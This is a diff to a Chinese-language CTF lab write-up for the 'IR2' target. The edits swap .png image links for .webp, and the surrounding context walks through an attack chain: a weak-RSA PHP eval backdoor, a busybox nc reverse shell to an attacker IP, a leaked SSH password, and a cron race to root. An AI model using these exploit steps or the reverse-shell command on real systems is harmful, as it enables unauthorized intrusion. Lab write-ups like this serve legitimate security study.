@@ -14,7 +14,7 @@
 | 开放端口 | 22/tcp、80/tcp |
 | 最终路径 | 目录枚举 → ZWCQA RSA 后门 → apache Shell → bd 泄露凭据 → SSH IR2 → safeguard 竞态 → root |
 
-![靶机地址与环境](/content/ir2/image-01.png)
+![靶机地址与环境](/content/ir2/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -39,11 +39,11 @@ nmap -sT -sV -sC -O -p- 192.168.134.68
 
 只开放 22 与 80。首页仍是伪造的 IIS 默认页，实际是 Apache。
 
-![IR2 伪造 IIS 首页](/content/ir2/image-02.png) ![首页与一代对照线索](/content/ir2/image-03.png)
+![IR2 伪造 IIS 首页](/content/ir2/image-02.webp) ![首页与一代对照线索](/content/ir2/image-03.webp)
 
 目录扫描后，结构比一代多了 `/backup/`、`/uploads/` 一类路径：
 
-![目录枚举结果](/content/ir2/image-04.png) ![backup / uploads 等路径](/content/ir2/image-05.png)
+![目录枚举结果](/content/ir2/image-04.webp) ![backup / uploads 等路径](/content/ir2/image-05.webp)
 
 关键命中与陷阱：
 
@@ -62,7 +62,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.68
 
 `/uqloads/ZWCQA.txt` 泄露了旧版后门逻辑：用硬编码弱 RSA 解密参数 `A`，再 `eval`。目录名和常见的 `/uploads/` 几乎一样，只差一个字母；这次复盘里我一开始也没找到这份 txt，是对照作者 WP 才定位到的。
 
-![ZWCQA.txt 后门源码泄露](/content/ir2/image-06.png)
+![ZWCQA.txt 后门源码泄露](/content/ir2/image-06.webp)
 
 核心逻辑可以概括为：
 
@@ -75,7 +75,7 @@ eval($g1);
 
 模数 `737 = 11 × 67`，`φ(737)=660`，`937×193 ≡ 1 (mod 660)`，数学上合法，但强度等于没有。
 
-![弱 RSA 参数分析](/content/ir2/image-09.png) ![加密参数与请求构造](/content/ir2/image-10.png)
+![弱 RSA 参数分析](/content/ir2/image-09.webp) ![加密参数与请求构造](/content/ir2/image-10.webp)
 
 线上部署版比泄露 txt 多了一层请求头校验：
 
@@ -89,7 +89,7 @@ if (strpos($_SERVER['HTTP_ACCEPT_ENCODING'] ?? '', 'gzip, deflate') === false) e
 2. POST 到 `/upload/ZWCQA.php`，参数名 `A`；
 3. 带上 `Accept-Encoding: gzip, deflate`。
 
-![作者提供的利用脚本/思路](/content/ir2/image-07.png) ![RCE 验证](/content/ir2/image-11.png)
+![作者提供的利用脚本/思路](/content/ir2/image-07.webp) ![RCE 验证](/content/ir2/image-11.webp)
 
 RSA 参数、请求头校验和利用写法，这次主要是跟着作者 WP 走通的；自己盲测时很容易卡在“请求发出去了却完全没回显”上。
 
@@ -103,7 +103,7 @@ nc -lvnp 4444
 busybox nc 192.168.134.4 4444 -e /bin/bash
 ```
 
-![获得 apache 反弹 Shell](/content/ir2/image-08.png)
+![获得 apache 反弹 Shell](/content/ir2/image-08.webp)
 
 > 复盘说明：RSA 细节、参数名与请求头校验，实战中若只靠盲测成本极高；泄露 txt 只能当旧样本，必须以线上行为为准。
 
@@ -115,7 +115,7 @@ busybox nc 192.168.134.4 4444 -e /bin/bash
 Please enter C2ip:C2port. You have 5 attempts...
 ```
 
-![发现 bd SUID 挑战](/content/ir2/image-12.png)
+![发现 bd SUID 挑战](/content/ir2/image-12.webp)
 
 正确 C2 为 `223.5.5.5:6666`（与环境中其他持久化痕迹一致）。猜对后它会“不小心”泄露攻击者个人主页：
 
@@ -123,7 +123,7 @@ Please enter C2ip:C2port. You have 5 attempts...
 https://textshare.online/d7a610/
 ```
 
-![猜对 C2 后泄露主页](/content/ir2/image-13.png) ![主页内容线索](/content/ir2/image-14.png)
+![猜对 C2 后泄露主页](/content/ir2/image-13.webp) ![主页内容线索](/content/ir2/image-14.webp)
 
 页面内容是一段 base64：
 
@@ -132,7 +132,7 @@ SVIyOkhlcmVJY29tZWFnYWlu
 → IR2:HereIcomeagain
 ```
 
-![base64 解码得到 IR2 口令](/content/ir2/image-15.png)
+![base64 解码得到 IR2 口令](/content/ir2/image-15.webp)
 
 据此 SSH 登录：
 
@@ -158,7 +158,7 @@ chmod 600 /home/IR2/.ssh/authorized_keys2
 
 root 每分钟执行的 `safeguard.sh` 会把 `/home/IR2` 整树拷到 `/root/`，再清理 `/root` 下不该留下的文件。一代有 `sleep 15`；二代删掉了 sleep，窗口极短。
 
-![safeguard 定时任务](/content/ir2/image-17.png)
+![safeguard 定时任务](/content/ir2/image-17.webp)
 
 做法是先在家目录堆大量小文件，让拷贝/删除变慢，再在 Kali 侧循环抢 `root` 的密钥登录窗口：
 
@@ -166,7 +166,7 @@ root 每分钟执行的 `safeguard.sh` 会把 `/home/IR2` 整树拷到 `/root/`�
 touch /home/IR2/f{1..5000}
 ```
 
-![用海量小文件拉长拷贝窗口](/content/ir2/image-16.png)
+![用海量小文件拉长拷贝窗口](/content/ir2/image-16.webp)
 
 当 `/root/.ssh/authorized_keys2` 短暂存在时：
 
